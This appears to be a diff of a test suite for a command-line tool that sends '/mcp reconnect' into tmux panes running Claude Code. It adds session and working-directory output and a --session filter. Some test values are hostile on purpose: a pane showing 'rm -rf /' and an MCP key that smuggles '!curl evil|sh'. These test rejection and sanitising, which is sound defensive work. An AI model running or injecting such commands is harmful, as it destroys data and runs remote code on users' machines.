@@ -220,6 +220,8 @@ describe("agent reconnect", () => {
 		foreground: true,
 		inMode: false,
 		synchronized: false,
+		session: "main",
+		cwd: "/home/repo",
 		...over
 	});
 
@@ -245,10 +247,11 @@ describe("agent reconnect", () => {
 			// first re-capture is for %2's pre-send check; then %1 is polled: still typing, then clear
 			d.tmuxPaneText.mockReturnValueOnce(IDLE).mockReturnValueOnce(TYPING).mockReturnValueOnce(IDLE);
 			expect(reconnect(["repo", "--wait", "1m", "--foreground"], config, d)).toBe(0);
-			expect(out).toContain(`repo ${SOCK} %1 github waiting (composer not empty, or a dialog is showing)`);
+			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github waiting (composer not empty, or a dialog is showing)`);
 			expect(out).toContain("waiting up to 1m for 1 pane to clear");
-			expect(out).toContain(`repo ${SOCK} %1 github sent`);
-			expect(out).toContain(`repo ${SOCK} %2 github sent`);
+			// %1 is sent to from the waiting loop, which carries the location computed at selection
+			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github sent`);
+			expect(out).toContain(`repo ${SOCK} %2 (main, /home/repo) github sent`);
 			expect(d.tmuxSend).toHaveBeenCalledTimes(2);
 			expect(d.sleep).toHaveBeenCalledTimes(2);
 			expect(d.sleep).toHaveBeenCalledWith(WAIT_POLL_MS);
@@ -261,7 +264,7 @@ describe("agent reconnect", () => {
 			expect(d.tmuxSend).not.toHaveBeenCalled();
 			// 5s, 5s, then the 2s left: never past the deadline
 			expect(d.sleep.mock.calls.map((c: number[]) => c[0])).toEqual([5000, 5000, 2000]);
-			expect(out).toContain(`repo ${SOCK} %1 github skipped (no Claude Code prompt on screen; still after waiting 12s)`);
+			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github skipped (no Claude Code prompt on screen; still after waiting 12s)`);
 			expect(out).toContain("waiting up to 12s for 1 pane to clear");
 		});
 
@@ -269,8 +272,8 @@ describe("agent reconnect", () => {
 			const { d, out } = withPanes([pane("%1", IDLE)]);
 			d.tmuxPaneText.mockReturnValueOnce(TYPING).mockReturnValueOnce(IDLE);
 			expect(reconnect(["repo", "--wait", "30s", "--foreground"], config, d)).toBe(0);
-			expect(out).toContain(`repo ${SOCK} %1 github waiting (changed since capture)`);
-			expect(out).toContain(`repo ${SOCK} %1 github sent`);
+			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github waiting (changed since capture)`);
+			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github sent`);
 		});
 
 		it("drops a pane that disappears while waiting, retries one whose capture times out, and counts a failed send as skipped", () => {
@@ -287,9 +290,9 @@ describe("agent reconnect", () => {
 				throw new Error("pane is dead");
 			});
 			expect(reconnect(["repo", "--wait", "1m", "--foreground"], config, d)).toBe(3);
-			expect(out).toContain(`repo ${SOCK} %3 github skipped (send failed: pane is dead)`);
-			expect(out).toContain(`repo ${SOCK} %1 github skipped (gone while waiting)`);
-			expect(out).toContain(`repo ${SOCK} %2 github sent`);
+			expect(out).toContain(`repo ${SOCK} %3 (main, /home/repo) github skipped (send failed: pane is dead)`);
+			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github skipped (gone while waiting)`);
+			expect(out).toContain(`repo ${SOCK} %2 (main, /home/repo) github sent`);
 			expect(out[out.length - 1]).toBe("sent 1, skipped 2");
 		});
 
@@ -306,7 +309,7 @@ describe("agent reconnect", () => {
 			expect(reconnect(["repo", "--wait", "1m"], config, d)).toBe(0);
 			expect(d.sleep).not.toHaveBeenCalled();
 			expect(d.startBackground).toHaveBeenCalledWith(["--wait", "1m", "--foreground", "--retry", `repo:%1@${SOCK}`]);
-			expect(out).toContain(`repo ${SOCK} %2 github sent`);
+			expect(out).toContain(`repo ${SOCK} %2 (main, /home/repo) github sent`);
 			expect(out).toContain(`waiting up to 1m in the background for 1 pane to clear: journalctl -u ${WAIT_UNIT} -f`);
 			expect(out[out.length - 1]).toBe("sent 1, skipped 0, waiting on 1 in the background");
 		});
@@ -320,7 +323,7 @@ describe("agent reconnect", () => {
 			expect(reconnect(["repo", "--wait", "1m"], config, d)).toBe(0);
 			expect(err).toContain("couldn't start the background wait (systemd-run: not found); waiting here instead");
 			expect(d.sleep).toHaveBeenCalledTimes(1);
-			expect(out).toContain(`repo ${SOCK} %1 github sent`);
+			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github sent`);
 		});
 
 		it("a background run touches only the panes it was handed", () => {
@@ -329,6 +332,8 @@ describe("agent reconnect", () => {
 			expect(reconnect(["--wait", "1m", "--foreground", "--retry", `repo:%1@${SOCK}`], config, d)).toBe(0);
 			expect(d.tmuxSend).toHaveBeenCalledTimes(1);
 			expect(d.tmuxSend).toHaveBeenCalledWith(SERVER, "%1", "/mcp reconnect github", info);
+			// the background run's waiting loop carries the location too
+			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github sent`);
 			expect(d.startBackground).not.toHaveBeenCalled();
 			expect(out.some((l: string) => l.includes("%2"))).toBe(false);
 			expect(out[out.length - 1]).toBe("sent 1, skipped 0");
@@ -368,7 +373,7 @@ describe("agent reconnect", () => {
 			const { d, out } = withPanes([pane("%1", TYPING)]);
 			expect(reconnect(["repo", "--dry-run", "--wait", "1m"], config, d)).toBe(3);
 			expect(d.sleep).not.toHaveBeenCalled();
-			expect(out).toContain(`repo ${SOCK} %1 github skipped (composer not empty, or a dialog is showing)`);
+			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github skipped (composer not empty, or a dialog is showing)`);
 		});
 	});
 
@@ -380,8 +385,8 @@ describe("agent reconnect", () => {
 		expect(d.tmuxPaneText).toHaveBeenCalledWith(SERVER, "%3", info);
 		expect(d.tmuxSend).toHaveBeenCalledTimes(1);
 		expect(d.tmuxSend).toHaveBeenCalledWith(SERVER, "%3", "/mcp reconnect github", info);
-		expect(out).toContain(`repo ${SOCK} %3 github sent`);
-		expect(out).toContain(`repo ${SOCK} %4 github skipped (claude is not the pane's foreground job)`);
+		expect(out).toContain(`repo ${SOCK} %3 (main, /home/repo) github sent`);
+		expect(out).toContain(`repo ${SOCK} %4 (main, /home/repo) github skipped (claude is not the pane's foreground job)`);
 		expect(out[out.length - 1]).toBe("sent 1, skipped 1");
 	});
 
@@ -390,28 +395,28 @@ describe("agent reconnect", () => {
 		expect(reconnect(["repo", "--dry-run"], config, d)).toBe(0);
 		expect(d.tmuxSend).not.toHaveBeenCalled();
 		expect(d.tmuxPaneText).not.toHaveBeenCalled();
-		expect(out).toContain(`repo ${SOCK} %3 github would send`);
+		expect(out).toContain(`repo ${SOCK} %3 (main, /home/repo) github would send`);
 		expect(out[out.length - 1]).toBe('dry run: 1 pane(s) would get "/mcp reconnect"');
 	});
 
 	it("re-captures before sending: a pane gone or typed into since the check is skipped, one that started working is still sent to", () => {
 		const gone = withPanes([pane("%1", IDLE)], {}, {}, null);
 		expect(reconnect(["repo"], config, gone.d)).toBe(3);
-		expect(gone.out).toContain(`repo ${SOCK} %1 github skipped (gone since capture)`);
+		expect(gone.out).toContain(`repo ${SOCK} %1 (main, /home/repo) github skipped (gone since capture)`);
 		expect(gone.d.tmuxSend).not.toHaveBeenCalled();
 		const busy = withPanes([pane("%2", IDLE)], {}, {}, BUSY);
 		expect(reconnect(["repo"], config, busy.d)).toBe(0);
-		expect(busy.out).toContain(`repo ${SOCK} %2 github sent`);
+		expect(busy.out).toContain(`repo ${SOCK} %2 (main, /home/repo) github sent`);
 		const typed = withPanes([pane("%3", IDLE)], {}, {}, "❯ rm -rf /\n");
 		expect(reconnect(["repo"], config, typed.d)).toBe(3);
-		expect(typed.out).toContain(`repo ${SOCK} %3 github skipped (changed since capture)`);
+		expect(typed.out).toContain(`repo ${SOCK} %3 (main, /home/repo) github skipped (changed since capture)`);
 	});
 
 	it("skips copy mode and synchronize-panes before anything else", () => {
 		const { d, out } = withPanes([pane("%1", IDLE, { inMode: true }), pane("%2", IDLE, { synchronized: true })]);
 		expect(reconnect(["repo"], config, d)).toBe(3);
-		expect(out).toContain(`repo ${SOCK} %1 - skipped (pane is in copy mode)`);
-		expect(out).toContain(`repo ${SOCK} %2 - skipped (synchronize-panes is on)`);
+		expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) - skipped (pane is in copy mode)`);
+		expect(out).toContain(`repo ${SOCK} %2 (main, /home/repo) - skipped (synchronize-panes is on)`);
 		expect(d.tmuxSend).not.toHaveBeenCalled();
 	});
 
@@ -425,11 +430,11 @@ describe("agent reconnect", () => {
 		]);
 		expect(reconnect(["repo"], config, d)).toBe(3);
 		expect(d.tmuxSend).toHaveBeenCalledTimes(2);
-		expect(out).toContain(`repo ${SOCK} %1 github sent`);
-		expect(out).toContain(`repo ${SOCK} %4 github sent`);
-		expect(out).toContain(`repo ${SOCK} %2 github skipped (composer not empty, or a dialog is showing)`);
-		expect(out).toContain(`repo ${SOCK} %5 github skipped (composer not empty, or a dialog is showing)`);
-		expect(out).toContain(`repo ${SOCK} %3 github skipped (no Claude Code prompt on screen)`);
+		expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github sent`);
+		expect(out).toContain(`repo ${SOCK} %4 (main, /home/repo) github sent`);
+		expect(out).toContain(`repo ${SOCK} %2 (main, /home/repo) github skipped (composer not empty, or a dialog is showing)`);
+		expect(out).toContain(`repo ${SOCK} %5 (main, /home/repo) github skipped (composer not empty, or a dialog is showing)`);
+		expect(out).toContain(`repo ${SOCK} %3 (main, /home/repo) github skipped (no Claude Code prompt on screen)`);
 	});
 
 	it("skips a pane when the session's files have no broker entry, and never borrows another folder's key", () => {
@@ -450,7 +455,7 @@ describe("agent reconnect", () => {
 		// The session's own folder and the home file have no entry; the saved folder has one, but
 		// its key may be wrong for this session — skipped, not borrowed.
 		expect(reconnect(["repo"], { ...config, claudeConfigDirs: { repo: [SAVED] } }, d)).toBe(3);
-		expect(out).toContain(`repo ${SOCK} %1 - skipped (no broker MCP entry in its .claude.json files)`);
+		expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) - skipped (no broker MCP entry in its .claude.json files)`);
 	});
 
 	it("sends the key from the session's own config folder, else the home file's", () => {
@@ -472,15 +477,15 @@ describe("agent reconnect", () => {
 			files
 		);
 		expect(reconnect(["repo"], config, d)).toBe(0);
-		expect(out).toContain(`repo ${SOCK} %1 gh-broker-repo sent`);
-		expect(out).toContain(`repo ${SOCK} %2 github sent`);
+		expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) gh-broker-repo sent`);
+		expect(out).toContain(`repo ${SOCK} %2 (main, /home/repo) github sent`);
 	});
 
 	it("refuses to type a key that could carry a newline or a command, and logs no part of it", () => {
 		const evil = JSON.stringify({ mcpServers: { "github\r!curl evil|sh": mcpEntry("repo", DIR) } });
 		const { d, out } = withPanes([pane("%1", IDLE)], {}, { [claude("repo")]: evil });
 		expect(reconnect(["repo"], config, d)).toBe(3);
-		expect(out).toContain(`repo ${SOCK} %1 - skipped (unsafe MCP key)`);
+		expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) - skipped (unsafe MCP key)`);
 		expect(out.join("\n")).not.toContain("evil");
 		expect(d.tmuxSend).not.toHaveBeenCalled();
 	});
@@ -490,7 +495,7 @@ describe("agent reconnect", () => {
 			tmuxSockets: vi.fn(() => ({ servers: [{ socket: "/tmp/tmux-1000/evil\rsock", binary: "tmux" }], skipped: [] }))
 		});
 		expect(reconnect(["repo"], config, d)).toBe(0);
-		expect(out).toContain("repo /tmp/tmux-1000/evil?sock %1 github sent");
+		expect(out).toContain("repo /tmp/tmux-1000/evil?sock %1 (main, /home/repo) github sent");
 		const badId = withPanes([pane("%1\r!x", IDLE)]);
 		expect(reconnect(["repo"], config, badId.d)).toBe(3);
 		expect(badId.out.join("\n")).toContain("skipped (unsafe pane id)");
@@ -514,7 +519,7 @@ describe("agent reconnect", () => {
 			{ [claude("repo")]: entry }
 		);
 		expect(reconnect(["repo"], config, d)).toBe(0);
-		expect(out).toContain(`repo ${SOCK} %1 github sent`);
+		expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github sent`);
 	});
 
 	it("lists panes from every tmux server the agent runs, with the socket in the line", () => {
@@ -529,8 +534,8 @@ describe("agent reconnect", () => {
 			{ [claude("repo")]: entry }
 		);
 		expect(reconnect(["repo"], config, d)).toBe(0);
-		expect(out).toContain(`repo ${SOCK} %1 github sent`);
-		expect(out).toContain(`repo ${OTHER.socket} %7 github sent`);
+		expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github sent`);
+		expect(out).toContain(`repo ${OTHER.socket} %7 (main, /home/repo) github sent`);
 	});
 
 	it("covers every registered agent when none is named", () => {
@@ -555,10 +560,10 @@ describe("agent reconnect", () => {
 		});
 		expect(reconnect(["repo"], config, d)).toBe(3);
 		expect(d.tmuxSend).toHaveBeenCalledTimes(2);
-		expect(out).toContain(`repo ${SOCK} %1 github skipped (send failed: server exited unexpectedly?[31m? and a C1 CSI)`);
+		expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github skipped (send failed: server exited unexpectedly?[31m? and a C1 CSI)`);
 		expect(out.join("\n")).not.toContain("\x1b");
 		expect(out.join("\n")).not.toContain("\x9b");
-		expect(out).toContain(`repo ${SOCK} %2 github sent`);
+		expect(out).toContain(`repo ${SOCK} %2 (main, /home/repo) github sent`);
 	});
 
 	it("counts sockets with no owning tmux process on one line, without counting them as skipped", () => {
@@ -588,15 +593,15 @@ describe("agent reconnect", () => {
 		);
 		expect(reconnect(["repo"], config, d)).toBe(3);
 		expect(out).toContain(`repo ${SOCK} - skipped (tmux timed out)`);
-		expect(out).toContain(`repo ${OTHER.socket} %9 github sent`);
+		expect(out).toContain(`repo ${OTHER.socket} %9 (main, /home/repo) github sent`);
 		expect(out[out.length - 1]).toBe("sent 1, skipped 1");
 	});
 
 	it("a pane whose capture times out is skipped with the timeout reason, and the next pane is judged", () => {
 		const { d, out } = withPanes([pane("%1", IDLE, { timedOut: true }), pane("%2", IDLE)]);
 		expect(reconnect(["repo"], config, d)).toBe(3);
-		expect(out).toContain(`repo ${SOCK} %1 - skipped (tmux timed out)`);
-		expect(out).toContain(`repo ${SOCK} %2 github sent`);
+		expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) - skipped (tmux timed out)`);
+		expect(out).toContain(`repo ${SOCK} %2 (main, /home/repo) github sent`);
 	});
 
 	it("a re-capture that times out skips the pane instead of judging a stale screen", () => {
@@ -606,8 +611,86 @@ describe("agent reconnect", () => {
 			})
 		});
 		expect(reconnect(["repo"], config, d)).toBe(3);
-		expect(out).toContain(`repo ${SOCK} %1 github skipped (tmux timed out)`);
+		expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github skipped (tmux timed out)`);
 		expect(d.tmuxSend).not.toHaveBeenCalled();
+	});
+
+	it("prints the pane's tmux session and working directory, control characters cleaned out of both", () => {
+		const { d, out } = withPanes([pane("%1", IDLE, { session: "mai\x07n", cwd: "/tmp/\rx" })]);
+		expect(reconnect(["repo"], config, d)).toBe(0);
+		expect(out).toContain(`repo ${SOCK} %1 (mai?n, /tmp/?x) github sent`);
+		expect(out.join("\n")).not.toContain("\x07");
+		expect(out.join("\n")).not.toContain("\r");
+	});
+
+	describe("--session", () => {
+		const TYPING = "❯ half a sentence";
+		it("keeps only the panes whose tmux session name matches, and says nothing about the rest", () => {
+			const { d, out } = withPanes([pane("%1", IDLE), pane("%2", IDLE, { session: "other" })]);
+			expect(reconnect(["repo", "--session", "main"], config, d)).toBe(0);
+			expect(d.tmuxSend).toHaveBeenCalledTimes(1);
+			expect(d.tmuxSend).toHaveBeenCalledWith(SERVER, "%1", "/mcp reconnect github", info);
+			expect(out.some((l: string) => l.includes("%2"))).toBe(false);
+			expect(out[out.length - 1]).toBe("sent 1, skipped 0");
+		});
+
+		it("matches pane ids too, and several values are a union", () => {
+			const { d, out } = withPanes([pane("%1", IDLE), pane("%2", IDLE, { session: "other" }), pane("%3", IDLE, { session: "third" })]);
+			expect(reconnect(["repo", "--session", "%3", "--session", "main"], config, d)).toBe(0);
+			expect(d.tmuxSend).toHaveBeenCalledTimes(2);
+			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github sent`);
+			expect(out).toContain(`repo ${SOCK} %3 (third, /home/repo) github sent`);
+			expect(out.some((l: string) => l.includes("%2"))).toBe(false);
+		});
+
+		it("filters a dry run", () => {
+			const { d, out } = withPanes([pane("%1", IDLE), pane("%2", IDLE, { session: "other" })]);
+			expect(reconnect(["repo", "--dry-run", "--session", "main"], config, d)).toBe(0);
+			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github would send`);
+			expect(out.some((l: string) => l.includes("%2"))).toBe(false);
+			expect(out[out.length - 1]).toBe('dry run: 1 pane(s) would get "/mcp reconnect"');
+		});
+
+		it("filters what --wait watches: the background run is handed only the matching panes", () => {
+			const { d, out } = withPanes([pane("%1", TYPING), pane("%2", TYPING, { session: "other" })]);
+			expect(reconnect(["repo", "--session", "main", "--wait", "1m"], config, d)).toBe(0);
+			expect(d.startBackground).toHaveBeenCalledWith(["--wait", "1m", "--foreground", "--retry", `repo:%1@${SOCK}`]);
+			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github waiting (composer not empty, or a dialog is showing)`);
+			expect(out.some((l: string) => l.includes("%2"))).toBe(false);
+		});
+
+		it("reports a --session that matched no pane, fails the run, and never says no sessions were running", () => {
+			const { d, out, err } = withPanes([pane("%1", IDLE)]);
+			expect(reconnect(["repo", "--session", "typo"], config, d)).toBe(1);
+			expect(err).toContain("no pane matched --session typo");
+			expect(d.tmuxSend).not.toHaveBeenCalled();
+			expect(d.startBackground).not.toHaveBeenCalled();
+			// the "no sessions running" line would be wrong here: the pane exists, it just didn't match
+			expect(out.some((l: string) => l.includes("no Claude Code sessions running"))).toBe(false);
+		});
+
+		it("an agent with no panes at all still gets the no-sessions line next to the report", () => {
+			const { d, out, err } = withPanes([]);
+			expect(reconnect(["repo", "--session", "main"], config, d)).toBe(1);
+			expect(out).toContain("repo: no Claude Code sessions running");
+			expect(err).toContain("no pane matched --session main");
+		});
+
+		it("a dry run with no match fails the same way", () => {
+			const { d, err } = withPanes([pane("%1", IDLE)]);
+			expect(reconnect(["repo", "--dry-run", "--session", "%9"], config, d)).toBe(1);
+			expect(err).toContain("no pane matched --session %9");
+		});
+
+		it("refuses a missing value, a flag as the value, and --session in the background run", () => {
+			const { d } = withPanes([pane("%1", IDLE)]);
+			expect(() => reconnect(["repo", "--session"], config, d)).toThrow("--session takes a tmux session name or a pane id");
+			expect(() => reconnect(["repo", "--session", "--dry-run"], config, d)).toThrow("--session takes a tmux session name or a pane id");
+			expect(() => reconnect(["repo", "--session", ""], config, d)).toThrow("--session takes a tmux session name or a pane id");
+			expect(() => reconnect(["--wait", "1m", "--foreground", "--retry", `repo:%1@${SOCK}`, "--session", "main"], config, d)).toThrow(
+				"--session is not for the background --wait run"
+			);
+		});
 	});
 
 	it("reports a registered agent with no user account and exits 1", () => {
